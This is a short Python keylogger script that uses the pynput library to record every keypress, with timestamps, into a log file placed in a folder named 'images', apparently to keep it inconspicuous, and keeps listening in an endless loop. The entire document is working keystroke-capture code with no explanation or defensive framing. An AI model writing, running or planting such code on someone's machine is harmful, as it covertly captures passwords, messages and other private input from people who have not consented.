import pythoncom,sys,logging
from  pynput.keyboard import Key,Listener


log_dir =  "images/"
logging.basicConfig(filename=(log_dir+"key_log.txt"),level=logging.DEBUG,format='%(asctime)s:%(message)s')

def on_press(key):
    logging.info(key)

while True:
    with Listener(on_press=on_press) as listener:
        listener.join()